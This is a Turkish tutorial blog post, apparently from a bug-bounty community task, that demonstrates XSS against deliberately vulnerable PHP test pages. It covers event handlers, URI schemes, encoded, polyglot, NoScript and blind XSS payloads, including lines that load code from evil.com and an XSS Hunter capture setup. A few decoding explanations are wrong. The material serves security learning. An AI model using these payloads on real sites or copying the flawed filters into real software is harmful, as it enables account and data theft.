---
title: Gallipoli Bug Bounty Community Task 2
date: 2024-07-19T15:51:46+03:00
tags: ["web", "xss", "bug"]

cover:
  image: "img/task2/task2-cover.webp"
  alt: "xss cover"
  # caption: "caption"
---

#### Not: Bu araştırma benim ve Ahmet Faruk Albayrak'ın ortak çalışmasıdır. Kendisinin blogunu [burada](https://far-jute-5c7.notion.site/Event-Handlers-Protocols-HTML-Tags-Encoding-Obfuscation-Polyglot-Noscript-Blind-XSS-Test-En-2434c4f3505e4c6898f125733ddbfc5e) bulabilirsiniz.

#### Not: Doğru bilinen yanlışlar doğrusu öğrenilince düzeltilecektir.

#### Test ortamlarının tamamına ulaşmak için: [link](http://35.187.63.168/index.html)

---

<br>

# Event Handler ile XSS Attack

### Event Handler Nedir?

[Test ortamı](http://35.187.63.168/task2/event-handlers/index.php)

Event handler'lar, HTML elementleri üzerinde çeşitli olayları (event) yakalayan ve yanıt veren JavaScript kodlarıdır. En yaygın event handler'lar şunlardır:<br>

- onclick: Bir öğeye tıklanıldığında çalışır.<br>
- onload: Bir öğe yüklendiğinde çalışır.<br>
- onerror: Bir hata oluştuğunda çalışır.<br>
- onfocus: Bir öğe odaklandığında çalışır.<br>
- onchange: Bir öğe değiştirildiğinde çalışır.<br>

Event handler'lar, kötü niyetli kodların web sayfasında çalıştırılmasına olanak tanıyabilir, bu da XSS saldırılarının uygulanmasına neden olabilir.

Örneklerle inceleyelim.

### img tag ve onerror event:

```php
$decoded = urldecode($userInput);
echo "<img src=\"" . $decoded . "\">";
```

**Payload:** `%2522%2520onerror=%2522alert()`

`%2522` iki kez encode edilmiş `"` karakteridir. İlk encode işleminde `%22` olur, ikinci encode işleminde `%2522` olur.
Çalışma: `onerror eventi`, resim yüklenemezse tetiklenir. Kullanıcı `img` etiketi için URL olarak `%2522%2520onerror=%2522alert()` gibi bir değer girerse, bu değer iki kez decode edilerek `"%20onerror="alert()` olur. Bu, `onerror eventini` tetikler ve `alert('XSS')` çalıştırır.

### svg tag ve onload event:

```php
$replaced = str_replace(">", "&gt;", $userInput);
echo "<svg height=\"" . $replaced . "\" width=\"100\" xmlns=\"http://www.w3.org/2000/svg\">
  <circle r=\"45\" cx=\"50\" cy=\"50\" stroke=\"green\" stroke-width=\"3\" fill=\"red\" \"/>
</svg>";
```

**Payload:** `%22+onload=%22alert()`

Encode: `%22` karakteri `"` ile aynı şeydir, `+onload=%22alert()` kısmı ise `onload eventine` alert`('XSS')` atar.
Çalışma: Kullanıcı `SVG` etiketinin height özelliğine `%22+onload=%22alert()` gibi bir değer girerse, bu değer HTML encode edilmez ve `onload eventi` tetiklenir, `alert('XSS')` çalıştırılır.

### Double Encode Edilmiş Payload ve onloadstart

```php
$ddecoded = urldecode(urldecode($userInput));
echo "<video src=\"" . $ddecoded . "\" autoplay></video>";
```

**Payload:** `%2522%2520onloadstart=%2522alert()`

Çift URL Encode: `%2522` iki kez URL encode edilmiştir. İlk decode işlemi `%22` sonucunu verir, ikinci decode işlemi ise `"` karakterini geri getirir.
Çalışma: Video etiketine çift encode edilmiş payload girildiğinde, bu payload iki kez decode edilerek `onloadstart="alert()` olur. `onloadstart eventi` tetiklenir ve `alert('XSS')` çalıştırılır.

### audio tag ve onplay event:

```php
echo "<audio src=\"" . $userInput . "\" autoplay></audio>";
```

**Payload:** `sound.mp3" onplay="alert()`

Payload: Burada `onplay eventi`, `audio` etiketine eklenecek bir JavaScript kodu içerir.
Çalışma: Kullanıcı audio etiketinin `src` özelliğine `sound.mp3" onplay="alert()` gibi bir değer girerse, `onplay event` tetiklenir ve `alert('XSS')` çalıştırılır.

### a tag ve onfocus event:

```php
echo "<a href=\"" . $userInput . "\" autofocus>Link</a>";
```

**Payload:** `"+onfocus="javascript:alert()`

Payload: `onfocus eventine` JavaScript kodu atanmıştır.
Çalışma: Kullanıcı `a` etiketinin `href` özelliğine `"+onfocus="javascript:alert()` gibi bir değer girerse, `onfocus eventi` tetiklenir ve `javascript:alert('XSS')` çalıştırılır.

### button tag ve onclick event (Base64 Encoded):

```php
$replaced2 = str_replace("\"", "", $userInput);
echo "<button type=\"submit\" formaction=\"" . base64_decode($replaced2) . "\">Click</button>";
```

**Payload:** IiBvbmNsaWNrPSJhbGVydCgp

Base64 Encode: `IiBvbmNsaWNrPSJhbGVydCgp` base64 encode edilmiş `onclick="alert()"` kodunu temsil eder.
Çalışma: Kullanıcı button etiketinin `formaction` özelliğine base64 encode edilmiş payload girerse, bu değer base64 decode edilerek `onclick="alert()" `olur. `onclick event` tetiklenir ve `alert('XSS')` çalıştırılır.

### input tag ve onchange event:

```php
echo "<input type=\"text\" placeholder=\"" . $userInput . "\" />";
```

**Payload:** %22+onchange=%22alert()
Encode: `%22` karakteri `"` ile aynı şeydir, `+onchange=%22alert()` kısmı ise `onchange eventine` `alert('XSS')` atar.
Çalışma: Kullanıcı `input` etiketinin `placeholder` özelliğine `%22+onchange=%22alert()` gibi bir değer girerse, bu değer HTML encode edilmez ve `onchange eventi` tetiklenir, `alert('XSS')` çalıştırılır.

**Sonuç olarak Event handler'lar, web sayfalarında XSS saldırıları gerçekleştirmek için potansiyel bir vektör sunar. Kullanıcıdan alınan verilerin event handler'lar içinde işlenmesi, kötü niyetli JavaScript kodlarının çalışmasına neden olabilir.**

---

# URI Scheme & Protocol ile XSS Attack

[Test ortamı](http://35.187.63.168/task2/protocol-tag/index.php)

Web uygulamalarında güvenlik açıkları, çeşitli yollarla ortaya çıkabilir ve URI (Uniform Resource Identifier) şemaları bu açıdan önemli bir riski temsil eder. URI şemaları, bir URL'nin protokol kısmını belirleyerek çeşitli türde kaynaklara erişim sağlar. Ancak, URI şemaları kötü niyetli kullanıcılar tarafından XSS saldırıları için kullanılabilir. Burada, URI şemalarının nasıl XSS saldırılarına neden olabileceğini ve belirli örnekler üzerinden bu zaafiyetlerin nasıl tetiklendiğini inceleyeceğiz.

### img tag ile javascript: URI Scheme

```html
<img src="$userInput" />
```

**Paylaod**

```
x" onerror="javascript:alert('xss')
```

**Nasıl Çalışır:** img tag'ında onerror olayı kullanılarak JavaScript kodu çalıştırılır. src özniteliğinde geçerli bir URL olmadığı için onerror olayı tetiklenir ve JavaScript kodu çalışır.

**Zaafiyet:** JavaScript kodları onerror olayında çalıştırılabilir, bu da XSS'e yol açar.

### embed tag ile javascript: URI Scheme

```html
<embed src="$userInput"></embed>
```

**Paylaod**

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları olabilir ve çalıştırılabilir.

**Zaafiyet:** Base64 kodlanmış veri filtrelenmediği için XSS saldırılarında kullanılabilir.

### embed tag ile data: URI Scheme

```html
<embed src="$userInput"></embed>
```

**Paylaod**

```js
data:text/html;base64,amF2YXNjcmlwdDphbGVydCgp" onload="eval(atob(this.src.split(',')[1]))
```

**Nasıl Çalışır:** data: URI scheme, URL'nin veri kısmını doğrudan içerir. Base64 ile kodlanmış veri, tarayıcı tarafından işlenir ve içeriği decode eder. Base64 ile kodlanmış içerik şu şekilde dekode edilir:
`amF2YXNjcmlwdDphbGVydCgp` — `<script>alert()</script>`

**onload event:** onload event, embed etiketi yüklendiğinde tetiklenir. Bu event, `eval(atob(this.src.split(',')[1]))` kodunu çalıştırır.

**atob() Fonksiyonu:** Bu fonksiyon base64 kodlu veriyi decode eder. `this.src.split(',')[1]` ifadesi, data: URI şeması içindeki base64 kodunu alır.

**eval() Fonksiyonu:** Decode edilen veriyi JavaScript kodu olarak çalıştırır. Bu, kötü niyetli JavaScript kodlarının yürütülmesine neden olur.

### a href ile javascript: URI Scheme

```html
<a href="$userInput">LINK</a>
```

**Paylaod**

```js
javascript: alert("xss");
```

**Nasıl Çalışır:** javascript: URI şeması, JavaScript kodlarını çalıştırmak için kullanılır. Bu kodlar linke tıklanmasıyla çalıştırılabilir.

**Zaafiyet:** JavaScript kodlarının doğrudan çalıştırılmasına izin veren URI şemaları filtrelenmediği için XSS'e sebep olur.

Sonuç olarak URI şemaları, XSS saldırılarına karşı hassas bir alan olabilir. Kullanıcı girdi verilerini doğru şekilde işlemek, filtrelemek ve kodlamak, XSS risklerini minimize etmek için kritik öneme sahiptir.

---

# Encoding & Obfuscating ile XSS Attack

[Test ortamı](http://35.187.63.168/task2/encoding-obfuscating/index.php)

HTML ve PHP kullanarak XSS saldırılarına karşı yapılan encoding ve obfuscation tekniklerini inceleyeceğiz. Bu kod, kullanıcıdan çeşitli encoding türlerinde veri alır ve veriyi uygun şekilde decode edip ekrana yazar. Ancak, encoding ve obfuscation yöntemleri bazen güvenlik açıklarını gizleyebilir ve bu da XSS saldırılarına yol açabilir. Her bir encoding ve obfuscation yöntemi ile ilgili detayları ele alarak, nasıl ve neden tetiklendiklerini açıklayacağız.

### Base64 Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputB64" required />
  <button type="submit">Base64</button>
</form>

if (isset($params['inputB64'])) {
  $b64decoded = base64_decode($params['inputB64']);
  echo "<p style='display: none;'>" . $b64decoded . "</p>";
}
```

**Base64 Encoded Payload**

```
PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+
```

**Nasıl Çalışır:** base64_decode fonksiyonu kullanılarak base64 encoded veri decode edilir sonrasında ekrana yazdırılır. Payload, script etiketini içerir ve base64 decode edildikten sonra, JavaScript kodu çalıştırmak için tetiklenir.

**Zaafiyet:** Base64 encoding, veri yükünü şifrelemez, sadece kodlar. Eğer base64 encoded veri doğru şekilde decode edilip çalıştırılabilirse, XSS saldırısı gerçekleştirilebilir.

### URL Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputURL" required />
  <button type="submit">URL Encode</button>
</form>

if (isset($params['inputURL'])) {
  $urldecoded = urldecode($params['inputURL']);
  echo "<p style='display: none;'>" . $urldecoded . "</p>";
}
```

**URL Encoded Payload**

```html
%3Cscript%3Ealert()%3C/script%3E
```

**Nasıl Çalışır:** urldecode fonksiyonu URL encoded veriyi decode eder ve veri ekrana yazdırılır. Payload, script etiketini içerir ve URL decode edildikten sonra, JavaScript kodu çalıştırmak için tetiklenir.

**Zaafiyet:** URL encoding, bazı karakterlerin özel anlamını gizler, ancak bu karakterler decode edildikten sonra yine de XSS saldırılarına yol açabilir.

### HTML Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputHTML" required />
  <button type="submit">HTML Encode</button>
</form>

if (isset($params['inputHTML'])) {
  $htmldecoded = html_entity_decode($params['inputHTML'], ENT_QUOTES | ENT_HTML5);
  echo "<p style='display: none;'>" . $htmldecoded . "</p>";
}
```

**HTML Encoded Payload**

```html
&lt;script&gt;alert()&lt;/script&gt;
```

**Nasıl Çalışır:** html_entity_decode fonksiyonu HTML encoded veri decode eder ardından veri ekrana yazdırılır. Payload, HTML karakterleri kodlanmış olarak gönderilir, ancak bu karakterler decode edildikten sonra JavaScript kodunu tetikler.

**Zaafiyet:** HTML encoding, karakterlerin özel HTML anlamlarını gizler, ancak bu karakterler decode edildikten sonra yine de XSS saldırılarına yol açabilir.

### Base64 & HTML Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputB64HTML" required />
  <button type="submit">Base64 & HTML Encode</button>
</form>

if (isset($params['inputB64HTML'])) {
  $b64htmldecoded = html_entity_decode(base64_decode($params['inputB64HTML']), ENT_QUOTES | ENT_HTML5);
  echo "<p style='display: none;'>" . $b64htmldecoded . "</p>";
}
```

**Base64 & HTML Encoded Payload**

```
Jmx0O3NjcmlwdCZndDthbGVydCZscGFyOyZycGFyOyZsdDsmc29sO3NjcmlwdCZndDs=
```

**Nasıl Çalışır:** base64_decode ve html_entity_decode fonksiyonları, base64 ve HTML encoded veriyi sırasıyla decode eder. Payload, önce base64 decode edilir, ardından HTML entity'leri decode edilir ve JavaScript kodunu tetikler.

**Zaafiyet:** Bu yöntem, hem base64 hem de HTML encoding kullanarak veri gizlemeyi amaçlar, ancak doğru decode edilirse XSS saldırısına açık olabilir.

### Base64 & URL Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputB64URL" required />
  <button type="submit">Base64 & URL Encode</button>
</form>

if (isset($params['inputB64URL'])) {
  $b64urldecoded = urldecode(base64_decode($params['inputB64URL']));
  echo "<p style='display: none;'>" . $b64urldecoded . "</p>";
}
```

**Base64 & URL Encoded Payload**

```
JTNDc2NyaXB0JTNFYWxlcnQoKSUzQy9zY3JpcHQlM0U=
```

**Nasıl Çalışır:** base64_decode ve urldecode fonksiyonları, base64 ve URL encoded veriyi sırasıyla decode eder. Payload, önce base64 decode edilir, ardından URL decode edilir ve JavaScript kodunu tetikler.

**Zaafiyet:** URL encoding ve base64 encoding kombinasyonu, XSS payload'larının gizlenmesine yardımcı olabilir, ancak doğru decode edilirse XSS saldırısı gerçekleştirebilir.

### HTML & URL Encoding

```php
<form action="" method="GET">
  <input type="text" name="inputHTML4URL" required />
  <button type="submit">HTML & URL Encode</button>
</form>

if (isset($params['inputHTML4URL'])) {
  $htmlurldecoded = urldecode(html_entity_decode($params['inputHTML4URL'], ENT_QUOTES | ENT_HTML5));
  echo "<p style='display: none;'>" . $htmlurldecoded . "</p>";
}
```

**HTML & URL Encoded Payload**

```html
&percnt;3Cscript&percnt;3Ealert&lpar;&rpar;&percnt;3C&sol;script&percnt;3E
```

**Nasıl Çalışır:** html_entity_decode ve urldecode fonksiyonları, HTML ve URL encoded veriyi sırasıyla decode eder. Payload, önce HTML entity'leri decode edilir, ardından URL decode edilir ve JavaScript kodunu tetikler.

**Zaafiyet:** HTML ve URL encoding kombinasyonu, XSS payload'larının gizlenmesini sağlar, ancak doğru şekilde decode edilirse XSS saldırısına yol açabilir.

Bu örneklerde, kodlar farklı encoding türlerini kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, her bir encoding ve obfuscation yöntemi XSS saldırılarına karşı tam bir koruma sağlamaz. Kodlarda kullanılan filtreleme ve encoding teknikleri, bazı XSS payload'larının tetiklenmesini önleyebilirken, diğerleri bu tekniklerden kaçabilir.

---

# Polyglot Payload ile XSS Attack

[Test ortamı](http://35.187.63.168/task2/polyglot/index.php)

PHP ile yazılmış bir web uygulamasında Polyglot XSS saldırılarını inceleyeceğiz. Polyglot XSS, farklı XSS vektörlerini birleştirerek birden çok güvenlik katmanını atlatmayı amaçlayan bir saldırı türüdür. Aşağıda verilen kodlar, çeşitli filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, bu kodun belirli zafiyetlere sahip olup olmadığını ve bu zafiyetlerin nasıl kullanılabileceğini göreceğiz.

### Test Case 1

```php
function filter($input) {
  $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
  $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
  $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
  $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
  $filtered = str_replace(['iframe', 'eval', 'onload', 'img', 'onclick'], '', $filtered);
  return $filtered;
}
function unsafeEcho($str) {
  echo filter($str);
}
echo "<p>1 " .  unsafeEcho($userInput) . "</p>";
```

**Zafiyet:** filter fonksiyonu çeşitli tehlikeli etiketleri ve olayları kaldırsa da, "<\img>" ve "onmouseover" gibi bazı önemli XSS vektörlerini yeterince engellemez. Ayrıca, kullanıcı girdisi doğrudan ekrana yazdırılırken HTML özel karakterleri encode edilmez, bu da XSS saldırılarına açık bir durum yaratır.

**Yukarıdaki kodu bypass edecek bir payload**

```html
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg style="border:1px solid black" onload=/*<html/*/onmouseover=alert()//>
```

### Test Case 2

```php
function filter($input) {
  $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
  $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
  $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
  $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
  $filtered = str_replace(['iframe', 'eval', 'onmouseover', 'img', 'textarea', 'onclick'], '', $filtered);
  return $filtered;
}
function unsafeEcho($str) {
  echo filter($str);
}
echo "<p>2 " .  htmlspecialchars(unsafeEcho($userInput), ENT_QUOTES) . "</p>";
```

**Filtreleme:** filter fonksiyonu, onmouseover ve textarea gibi ek XSS vektörlerini de kaldırır. Ayrıca, unsafeEcho fonksiyonu ile çıktı HTML özel karakterleri encode edilir.

**Zaafiyet:** Bu örnekte diğer örnekten farklı olarak "onload" gibi vektörler yeterince filtrelemeyebilir.

**Yukarıdaki kodu bypass edecek bir payload**

```html
javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>
```

### Test Case 3

```php
function filter($input) {
  $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
  $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
  $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
  $filtered = str_replace(['expression('], '', $filtered);
  $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover'], '', $filtered);
  return $filtered;
}
function unsafeEcho($str) {
  echo filter($str);
}
echo "<p>3 " . unsafeEcho($userInput) . "</p>";
```

**Filtreleme:** filter fonksiyonu, onload ve onmouseover gibi ek XSS vektörlerini de kaldırır. Ancak, hala bazı zafiyetler olabilir.

**Zaafiyet:** Bu fonksiyon, belirli URI şemalarını (örneğin javascript:) ve HTML etiketlerini filtrelerken yeterince kapsamlı olmayabilir.

**Yukarıdaki kodu bypass edecek bir payload**

```html
javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg style="border:1px solid black" onclick=javascript:alert()><frame src=javascript:alert()>
```

Sonuç olarak Polyglot XSS saldırıları, çeşitli XSS vektörlerini birleştirerek birçok filtreleme katmanını atlatmayı hedefler. Yukarıdaki PHP kodları, farklı filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, her kodun kendine özgü zafiyetleri olma ihtimali gözden kaçırılmamalıdır.

---

# Noscript XSS Attack

[Test ortamı](http://35.187.63.168/task2/noscript/index.php)

NoScript XSS saldırıları, JavaScript'in devre dışı bırakıldığı, çalışmadığı veya filtrelendiği durumlarda XSS açıklarını kullanmayı amaçlayan saldırılardır. Bu tür saldırılar, JavaScript'i engelleyen güvenlik önlemlerinin etrafından dolanmak için HTML ve CSS gibi diğer web teknolojilerini kullanır. Hedef, tarayıcıda JavaScript çalıştırılamasa bile zararlı içeriklerin gösterilmesini sağlamaktır.

### Test Case

```php
<?php
  function filter($input) {
    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
    $filtered = str_replace(['iframe', 'eval', 'onmouseover', 'img', 'textarea', 'onclick', 'svg', 'onload', 'onerror', 'script', 'a'], '', $filtered);
    return $filtered;
  }
  $userInput = filter(isset($_GET['message']) ? $_GET['message'] : '');
  echo $userInput;
?>
```

Back-end tarafında bazı filtrelemeler gerçekleştiği için doğrudan JavaScript çalıştıracak bir payload kullanamıyoruz. Bu durumda filtreyi bypass edecek yöntemlere ihtiyacımız var. Burada diğer HTML elementlerinden yararlanabiliriz. Örnek olarak "link" elementi url ile kaynak import etmeyi sağlıyor. Zararlı bir JS, CSS, favicon vs. çağırarak zararlı kod veya dosya çalıştırabiliriz.

Aşağıdaki payload zararlı JavaScript dosyası çağırır ve çalıştırır.

```html
<link rel="stylesheet" href="http://evil.com/malicious.js" />
```

Bu paylaod ise zararlı CSS dosyası çağırır ve çalıştırır.

```html
<link rel="stylesheet" href="http://evil.com/malicious.css" />

CSS içeriği : @import 'javascript:alert("XSS")';
```

NoScript XSS saldırıları, JavaScript devre dışı bırakıldığında bile XSS açıklarından yararlanmayı hedefler. Yukarıdaki PHP kodu, kullanıcı girdilerini filtrelemeye çalışsa da, CSS ve HTML tabanlı XSS saldırılarına karşı yeterli koruma sağlamayabilir. Güvenli bir uygulama geliştirmek için, tüm kullanıcı girdilerini dikkatlice işlemek, HTML ve CSS içeriğini encode etmek ve etkili bir CSP kullanmak önemlidir.

# Blind XSS Attack

[Test ortamı](http://35.187.63.168/task2/blind-xss/index.php)

Blind XSS, kurbanın saldırının etkilerini doğrudan görmediği XSS saldırılarıdır. Saldırgan, hedef uygulamaya zararlı bir komut veya kod yerleştirir, ancak bu kod hemen çalışmaz; uygulamanın başka bir bölümü tarafından çalıştırıldığında etkisini gösterir. Saldırı girişleri genellikle teknik destek chat alanları, log kayıtları, e-posta bildirimleri veya yönetici panelleri gibi yerlerde tetiklenir.

### Test Case

Örneğimizde feedback için bir input alanı var ve gönderdiğimiz metnin nereye gittiğini bilmiyoruz.
![1](/img/task2/1-page1.png)
Bir veritabanına kaydedilip başka bir sayfada çağırılacağını umuyor ve teste başlıyoruz. Metin yerine XSS payloadı yazarsak ne olacağını merak ediyor ve XSS Hunter uygulamasından bir payload alıyoruz.

![2](/img/task2/2-xsshunter1.png)
Payloadı gönderdikten sonra XSS Hunter uygulamasında bir sonuç bekliyoruz.

Site Admini panele girip feedbackleri kontrol ediyor ve XSS payloadı tetikleniyor.

![3](/img/task2/5-page3.png)

XSS Hunter'a baktığımızda payloadın hedefte tetiklendiğini ve senaryoya bağlı olarak bilgileri ele geçirdiğini görüyoruz.

![4](/img/task2/6-xsshunter3.png)

Bu tür saldırılar, saldırının hemen fark edilmemesi ve genellikle daha derin ve karmaşık güvenlik katmanlarını hedeflemesi nedeniyle daha tehlikelidir. Blind XSS, güvenlik testi ve tespit süreçlerini zorlaştırdığı için özellikle dikkat edilmesi gereken bir güvenlik açığıdır.
